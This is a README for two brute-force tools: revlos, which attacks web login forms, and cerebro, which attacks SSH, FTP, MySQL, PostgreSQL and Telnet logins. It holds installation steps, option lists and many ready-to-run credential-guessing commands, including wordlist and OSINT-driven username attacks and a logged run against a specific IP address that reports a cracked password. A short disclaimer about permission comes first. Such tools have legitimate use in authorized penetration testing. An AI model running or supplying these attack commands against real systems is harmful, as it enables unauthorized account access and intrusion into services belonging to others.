Unauthorized access to computer systems is illegal. Always obtain written permission before testing. The authors assume no liability for misuse of this tool.


## Installation

### revlos (HTTP/HTTPS Web Login Brute-Forcing)

```bash
# Get
git clone https://github.com/emdnaia/revlos.git
cd revlos

# Initialize a Go module
go mod init revlos

# Download dependencies
go mod tidy

# Build
go build -o revlos revlos.go

# Optional: Install dependencies for full features
# Hashcat (for keyword password generation)
sudo apt install hashcat

# CUPP (for personalized password generation)
git clone https://github.com/Mebus/cupp.git

# username-anarchy (for OSINT username generation)
git clone https://github.com/urbanadventurer/username-anarchy.git
```

---

### cerebro (Multi-Protocol Authentication Testing)

```bash
# Navigate to project directory
cd /path/to/brute-forcing

# Download dependencies
go get github.com/go-sql-driver/mysql
go get github.com/jlaffaye/ftp
go get github.com/lib/pq
go get golang.org/x/crypto/ssh

# Build
go build -o cerebro cerebro.go

# Verify installation
./cerebro --help
```

---

## ? revlos - HTTP/HTTPS Web Login Brute-Forcing

### Basic Usage

```bash
# Auto-detection mode (recommended)
./revlos --auto -L users.txt -P passwords.txt http://target.com

# Manual mode with form specification
./revlos -L users.txt -P passwords.txt \
  http://target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

# HTTP Basic Authentication
./revlos --auto -L users.txt -P passwords.txt --basic-auth http://target.com

# Stop on first valid credential
./revlos --auto -L users.txt -P passwords.txt -f http://target.com

# Headless mode for JavaScript/SPA sites
./revlos --auto -L users.txt -P passwords.txt --headless http://target.com
```

---

### Usage Examples

#### Web Application Login
```bash
./revlos --auto -L usernames.txt -P rockyou.txt \
  -f --timeout 15 http://example.com/login
```

#### Custom Success Detection
```bash
./revlos -L users.txt -P passwords.txt \
  --success-text "Welcome" \
  --any-redirect \
  http://target.com/auth
```

#### OSINT-Enhanced Attack
```bash
./revlos --osint --auto -L users.txt -P passwords.txt \
  --username-anarchy-path ./username-anarchy/username-anarchy \
  http://corporate-site.com/login
```

#### Rate-Limited Target
```bash
./revlos --auto -L users.txt -P passwords.txt \
  -t 10 --timeout 30 \
  http://slow-target.com
```

#### Single Credential Test
```bash
./revlos -l admin -p Admin123 --auto http://target.com
```

---

### Command-Line Options

#### Core Options
```
-l <user>          Single username (literal)
-L <file>          Username list file or URL
-p <pass>          Single password (literal)
-P <file>          Password list file or URL
-f                 Stop on first valid credential
-s <port>          Port (default: 80)
-t <threads>       Parallel tasks (default: 100)
-q                 Quiet mode
-v                 Verbose mode
```

#### Auto-Detection
```
--auto             Auto-detect form fields and error messages
--headless         Use headless browser for JavaScript sites
--basic-auth       Force HTTP Basic Authentication mode
```

#### Success Detection
```
--success-text <s>    Text in response indicating success
--success-cookie <c>  Cookie name indicating success
--success-code <c>    HTTP status codes for success (e.g., 200,302)
--any-redirect        Treat any 3xx redirect as success
```

#### Advanced Options
```
--timeout <n>         Request timeout in seconds (default: 10)
--max-time <n>        Maximum total time in seconds
--method <m>          HTTP method: GET or POST (default: POST)
--header <h>          Custom headers (comma-separated)
--learning-rate <r>   RL learning rate 0.0-1.0 (default: 0.4)
--batch-size <n>      Credentials per batch (default: 150)
```

#### OSINT Options
```
--osint                      Enable OSINT intelligence gathering
--username-anarchy-path <p>  Path to username-anarchy tool
```

---

## ? cerebro - Multi-Protocol Authentication Testing

### Basic Usage

```bash
# SSH brute-forcing
./cerebro -M ssh -h target.com:22 -u admin -P passwords.txt -t 8 -rl -f

# FTP brute-forcing
./cerebro -M ftp -h target.com:21 -u admin -P passwords.txt -t 8 -rl -f

# MySQL brute-forcing
./cerebro -M mysql -h target.com:3306 -u root -P passwords.txt -t 8 -rl -f

# PostgreSQL brute-forcing
./cerebro -M postgres -h target.com:5432 -u postgres -P passwords.txt -t 8 -rl -f

# Multiple users (username list)
./cerebro -M ssh -h target.com:22 -L users.txt -P passwords.txt -t 8 -rl -f
```

---

### Usage Examples

#### SSH Attack with RL
```bash
./cerebro -M ssh -h 83.136.249.47:48825 -u satwossh -P passwords.txt -t 8 -rl -f
# Result: Found satwossh:password1 in 5.26s (23 attempts)
```

#### FTP Brute-Force (Multiple Users)
```bash
# Generate username variations first
cd username-anarchy
./username-anarchy Thomas Smith > ../thomas-users.txt
cd ..

# Attack with cerebro
./cerebro -M ftp -h target.com:21 -L thomas-users.txt -P passwords.txt -t 8 -rl -f
```

#### MySQL Root Password Recovery
```bash
./cerebro -M mysql -h localhost:3306 -u root -P rockyou.txt -t 10 -rl -f
```

#### SSH with Rate Limiting (Fewer Threads)
```bash
./cerebro -M ssh -h target.com:22 -u admin -P passwords.txt -t 4 -rl -f
```

#### Quiet Mode (No Progress Output)
```bash
./cerebro -M ssh -h target.com:22 -u admin -P passwords.txt -t 8 -rl -f -q
```

---

### Command-Line Options

#### Core Options
```
-M <protocol>      Protocol (short): ssh, ftp, mysql, postgres, telnet
--protocol <p>     Protocol (long)
-h <host:port>     Target host and port
-u <user>          Single username
-L <file>          Username list file
-p <pass>          Single password
-P <file>          Password list file
-t <threads>       Parallel workers (default: 20)
-f                 Stop on first success (default: true)
-q                 Quiet mode
```

#### RL Options
```
-rl                Use RL algorithms (default: true)
--learning-rate <r>   RL learning rate 0.0-1.0 (default: 0.4)
--batch-size <n>      Credentials per batch (default: 150)
```

#### Supported Protocols
```
ssh         SSH (Secure Shell) - Port 22
ftp         FTP (File Transfer Protocol) - Port 21
mysql       MySQL Database - Port 3306
postgres    PostgreSQL Database - Port 5432
telnet      Telnet - Port 23
```
